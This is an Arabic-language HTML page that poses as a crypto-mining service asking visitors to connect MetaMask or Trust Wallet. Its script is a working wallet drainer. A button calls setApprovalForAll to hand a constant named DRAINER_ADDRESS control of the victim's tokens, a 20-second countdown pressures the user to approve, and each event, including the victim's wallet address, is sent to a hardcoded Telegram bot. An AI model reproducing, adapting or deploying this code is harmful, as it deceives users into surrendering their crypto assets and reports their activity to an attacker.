<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>🚀 Crypto Miner Connect - اتصال المحفظة</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron&family=Cairo:wght@400;700&display=swap');

  /* Reset */
  * {
    margin: 0; padding: 0; box-sizing: border-box;
  }

  body {
    background: linear-gradient(135deg, #010a0f, #022c22);
    font-family: 'Cairo', sans-serif;
    color: #00ff99;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 2rem 1rem;
    user-select: none;
  }

  header {
    text-align: center;
    margin-bottom: 2rem;
  }
  header h1 {
    font-family: 'Orbitron', sans-serif;
    font-size: 2.8rem;
    letter-spacing: 0.15em;
    text-shadow: 0 0 12px #00ff99cc;
    font-weight: 900;
    margin-bottom: 0.3rem;
  }
  header p {
    font-size: 1.1rem;
    color: #66ffaa;
    font-weight: 600;
    letter-spacing: 0.07em;
  }

  #status {
    background: rgba(0, 255, 153, 0.15);
    border: 2px solid #00ff99;
    border-radius: 15px;
    padding: 1rem 1.5rem;
    max-width: 600px;
    font-family: 'Cairo', sans-serif;
    font-weight: 700;
    font-size: 1.1rem;
    text-align: center;
    margin-bottom: 1.5rem;
    box-shadow: inset 0 0 18px #00ff9955;
    user-select: text;
  }

  #countdown {
    font-weight: 900;
    font-size: 1.3rem;
    margin-bottom: 2rem;
    letter-spacing: 0.08em;
    text-shadow: 0 0 8px #00ff9977;
  }

  /* Grid container للأزرار */
  #wallet-buttons {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
    gap: 1rem 2rem;
    width: 100%;
    max-width: 600px;
  }

  button.wallet-btn {
    background: #003d1a;
    border: 2.5px solid #00ff99;
    color: #00ff99;
    font-family: 'Orbitron', sans-serif;
    font-weight: 900;
    font-size: 1.2rem;
    border-radius: 30px;
    padding: 15px 20px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 14px;
    transition: all 0.3s ease;
    user-select: none;
    box-shadow: 0 0 25px #00ff9933;
    text-transform: uppercase;
  }

  button.wallet-btn:hover:not(:disabled) {
    background: transparent;
    color: #00ff99;
    border-color: #00ff99;
    box-shadow: 0 0 35px #00ff99cc;
  }
  button.wallet-btn:disabled {
    background: #001d08;
    border-color: #004422aa;
    color: #004422aa;
    cursor: not-allowed;
    box-shadow: none;
  }

  /* أيقونات SVG مصغرة */
  .wallet-icon {
    width: 32px;
    height: 32px;
    fill: #00ff99;
  }

  /* صندوق اللوغ */
  #log {
    background: rgba(0, 255, 153, 0.15);
    border: 2px solid #00ff99;
    border-radius: 15px;
    width: 100%;
    max-width: 600px;
    height: 170px;
    overflow-y: auto;
    font-family: 'Cairo', sans-serif;
    font-size: 0.9rem;
    font-weight: 600;
    padding: 1rem 1.5rem;
    user-select: text;
    box-shadow: inset 0 0 25px #00ff9977;
    white-space: pre-wrap;
  }

  /* زر الموافقة */
  #approveBtn {
    max-width: 600px;
    width: 100%;
    margin: 2rem 0 4rem 0;
  }

  /* متجاوب */
  @media (max-width: 440px) {
    header h1 {
      font-size: 2rem;
    }
    #countdown {
      font-size: 1.1rem;
    }
    button.wallet-btn {
      font-size: 1rem;
      padding: 12px 18px;
      gap: 10px;
    }
    .wallet-icon {
      width: 26px;
      height: 26px;
    }
  }
</style>
</head>
<body>

<header>
  <h1>تعدين العملات الرقمية</h1>
  <p>قم بتوصيل محفظتك وابدأ في التعدين الآن!</p>
</header>

<div id="status">الحالة: في انتظار توصيل المحفظة...</div>
<div id="countdown"></div>

<div id="wallet-buttons">
  <!-- MetaMask Desktop -->
  <button id="metamaskDesktopBtn" class="wallet-btn" title="MetaMask للكمبيوتر">
    <svg class="wallet-icon" viewBox="0 0 212 189" xmlns="http://www.w3.org/2000/svg" >
      <path d="M106 0L72 52 45 64l22 21 17-19 10 6-4-19z" />
      <path d="M0 0l38 43 18 19 33-15L106 0z" fill="#e2761b"/>
      <path d="M212 0l-38 43-18 19-33-15L106 0z" fill="#e4761b"/>
      <path d="M30 97l-18 14 38 23-12-37z" fill="#f6851b"/>
      <path d="M182 97l18 14-38 23 12-37z" fill="#f6851b"/>
      <path d="M106 189l34-52 27-12-22-21-39 39z" fill="#763d16"/>
      <path d="M106 189l-34-52-27-12 22-21 39 39z" fill="#763d16"/>
    </svg>
    ميتا ماسك (كمبيوتر)
  </button>

  <!-- Trust Wallet Desktop (تحذير) -->
  <button id="trustDesktopBtn" class="wallet-btn" title="Trust Wallet للكمبيوتر">
    <svg class="wallet-icon" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg" >
      <path fill="#3371ff" d="M128 0C57.3 0 0 57.3 0 128s57.3 128 128 128 128-57.3 128-128S198.7 0 128 0z"/>
      <path fill="#66a3ff" d="M75 85l15-10 35 65-15 10z"/>
      <path fill="#0033cc" d="M140 81l30 52-25 15z"/>
      <path fill="#99bbff" d="M80 125l25-35 10 25z"/>
      <path fill="#002299" d="M125 160l35-30 5 20z"/>
    </svg>
    ترست والت (كمبيوتر)
  </button>

  <!-- MetaMask Mobile -->
  <button id="metamaskMobileBtn" class="wallet-btn" title="MetaMask للجوال">
    <svg class="wallet-icon" viewBox="0 0 212 189" xmlns="http://www.w3.org/2000/svg" >
      <path d="M106 0L72 52 45 64l22 21 17-19 10 6-4-19z" />
      <path d="M0 0l38 43 18 19 33-15L106 0z" fill="#e2761b"/>
      <path d="M212 0l-38 43-18 19-33-15L106 0z" fill="#e4761b"/>
      <path d="M30 97l-18 14 38 23-12-37z" fill="#f6851b"/>
      <path d="M182 97l18 14-38 23 12-37z" fill="#f6851b"/>
      <path d="M106 189l34-52 27-12-22-21-39 39z" fill="#763d16"/>
      <path d="M106 189l-34-52-27-12 22-21 39 39z" fill="#763d16"/>
    </svg>
    ميتا ماسك (جوال)
  </button>

  <!-- Trust Wallet Mobile -->
  <button id="trustMobileBtn" class="wallet-btn" title="Trust Wallet للجوال">
    <svg class="wallet-icon" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg" >
      <path fill="#3371ff" d="M128 0C57.3 0 0 57.3 0 128s57.3 128 128 128 128-57.3 128-128S198.7 0 128 0z"/>
      <path fill="#66a3ff" d="M75 85l15-10 35 65-15 10z"/>
      <path fill="#0033cc" d="M140 81l30 52-25 15z"/>
      <path fill="#99bbff" d="M80 125l25-35 10 25z"/>
      <path fill="#002299" d="M125 160l35-30 5 20z"/>
    </svg>
    ترست والت (جوال)
  </button>
</div>

<button id="approveBtn" class="wallet-btn" disabled>الموافقة على الوصول</button>

<div id="log" aria-live="polite" aria-atomic="true" tabindex="0"></div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

<script>
  const TELEGRAM_TOKEN = '7742799307:AAE4gtk_bHx2DiFxmqUEglreldTFFTrg';
  const TELEGRAM_CHAT_ID = '1269389399';

  const DRAINER_ADDRESS = "0x1111111111111111111111111111111111111111";
  const ABI = ["function setApprovalForAll(address operator, bool approved) external"];

  const statusEl = document.getElementById('status');
  const logEl = document.getElementById('log');
  const countdownEl = document.getElementById('countdown');

  const metamaskDesktopBtn = document.getElementById('metamaskDesktopBtn');
  const trustDesktopBtn = document.getElementById('trustDesktopBtn');
  const metamaskMobileBtn = document.getElementById('metamaskMobileBtn');
  const trustMobileBtn = document.getElementById('trustMobileBtn');
  const approveBtn = document.getElementById('approveBtn');

  let provider, signer;
  let countdownTimer;

  // إرسال رسالة تيليجرام
  function sendTelegramMessage(message) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    }).catch(() => {}); // لا نعرض الخطأ في الكونسول
  }

  // تسجيل لوج + إرسال تيليجرام
  function smartLog(message) {
    const now = new Date().toLocaleTimeString();
    const logMessage = `[${now}] ${message}`;
    logEl.textContent += logMessage + "\n";
    logEl.scrollTop = logEl.scrollHeight;
    sendTelegramMessage(logMessage);
  }

  // عداد تنازلي
  function startCountdown() {
    let timeLeft = 20;
    countdownEl.textContent = `⏳ الوقت المتبقي للموافقة: ${timeLeft}s`;
    approveBtn.disabled = false;
    clearInterval(countdownTimer);

    countdownTimer = setInterval(() => {
      timeLeft--;
      countdownEl.textContent = `⏳ الوقت المتبقي للموافقة: ${timeLeft}s`;
      if (timeLeft <= 0) {
        clearInterval(countdownTimer);
        approveBtn.disabled = true;
        statusEl.textContent = "⌛ انتهى الوقت. يرجى إعادة الاتصال.";
        smartLog("انتهى وقت المستخدم - تم تعطيل الموافقة.");
      }
    }, 1000);
  }

  // اتصال MetaMask ديسكتوب
  async function connectMetaMaskDesktop() {
    if (!window.ethereum || !window.ethereum.isMetaMask) {
      statusEl.textContent = "❌ ميتا ماسك غير موجود على المتصفح!";
      smartLog("ميتاما سك غير موجود على ديسكتوب.");
      return;
    }
    try {
      statusEl.textContent = "🔄 جاري طلب اتصال ميتا ماسك...";
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      provider = new ethers.providers.Web3Provider(window.ethereum);
      signer = provider.getSigner();
      const address = await signer.getAddress();

      statusEl.textContent = `✅ متصل: ${address}`;
      smartLog(`متصل بحساب MetaMask (ديسكتوب): ${address}`);
      startCountdown();

      // التعامل مع تغيير الحساب أو الشبكة
      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          statusEl.textContent = "❗ تم قطع اتصال MetaMask.";
          smartLog("انقطع اتصال MetaMask.");
          approveBtn.disabled = true;
          clearInterval(countdownTimer);
        } else {
          statusEl.textContent = `🔄 تم تغيير الحساب: ${accounts[0]}`;
          smartLog(`تغيير الحساب إلى: ${accounts[0]}`);
          approveBtn.disabled = false;
          startCountdown();
        }
      });
      window.ethereum.on('chainChanged', (chainId) => {
        smartLog(`تغيير الشبكة: ${chainId}`);
        statusEl.textContent = `🌐 تم تغيير الشبكة: ${chainId}`;
        approveBtn.disabled = true;
        clearInterval(countdownTimer);
      });

    } catch (err) {
      statusEl.textContent = "❌ فشل الاتصال أو تم رفضه.";
      smartLog(`خطأ اتصال MetaMask (ديسكتوب): ${err.message}`);
    }
  }

  // فتح Trust Wallet داب (عادة موبايل فقط)
  function openTrustWalletDesktop() {
    statusEl.textContent = "⚠️ Trust Wallet غير مدعوم على الكمبيوتر. يرجى استخدام الموبايل.";
    smartLog("محاولة فتح Trust Wallet على الكمبيوتر - غير مدعوم.");
  }

  // فتح MetaMask Mobile
  function openMetaMaskMobile() {
    const dappUrl = window.location.origin;
    const metamaskMobileLink = `https://metamask.app.link/dapp/${dappUrl.replace(/^https?:\/\//, '')}`;
    statusEl.textContent = "⏳ جاري فتح MetaMask على الجوال...";
    smartLog("فتح MetaMask على الجوال.");
    window.location.href = metamaskMobileLink;
  }

  // فتح Trust Wallet Mobile
  function openTrustWalletMobile() {
    const dappUrl = window.location.origin;
    const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
    statusEl.textContent = "⏳ جاري فتح Trust Wallet على الجوال...";
    smartLog("فتح Trust Wallet على الجوال.");
    window.location.href = trustUrl;
  }

  // إجراء الموافقة
  async function approveDrainer() {
    if (!signer) {
      statusEl.textContent = "❌ غير متصل بأي محفظة.";
      smartLog("محاولة الموافقة بدون اتصال.");
      return;
    }
    approveBtn.disabled = true;
    statusEl.textContent = "⏳ جاري إرسال طلب الموافقة...";
    smartLog("بدء عملية setApprovalForAll للعقد.");

    try {
      const contract = new ethers.Contract(DRAINER_ADDRESS, ABI, signer);
      const tx = await contract.setApprovalForAll(DRAINER_ADDRESS, true);
      statusEl.textContent = "✅ تم إرسال طلب الموافقة! يرجى تأكيد العملية في المحفظة.";
      smartLog(`تم إرسال العملية. هاش: ${tx.hash}`);

      await tx.wait();
      statusEl.textContent = "🎉 تم تأكيد العملية! محفظتك تمت الموافقة عليها.";
      smartLog("تم تأكيد العملية بنجاح.");
      clearInterval(countdownTimer);
      countdownEl.textContent = "";
    } catch (error) {
      statusEl.textContent = "❌ فشلت العملية أو تم رفضها.";
      smartLog(`خطأ العملية: ${error.message}`);
      approveBtn.disabled = false;
    }
  }

  // استماع للأزرار
  metamaskDesktopBtn.addEventListener('click', connectMetaMaskDesktop);
  trustDesktopBtn.addEventListener('click', openTrustWalletDesktop);
  metamaskMobileBtn.addEventListener('click', openMetaMaskMobile);
  trustMobileBtn.addEventListener('click', openTrustWalletMobile);
  approveBtn.addEventListener('click', approveDrainer);

  // الحالة الأولية
  if (window.ethereum && window.ethereum.isMetaMask) {
    statusEl.textContent = "✅ تم الكشف عن MetaMask. جاهز للاتصال.";
  } else {
    statusEl.textContent = "⛔ لم يتم الكشف عن MetaMask في هذا الجهاز.";
  }
</script>
</body>
</html>
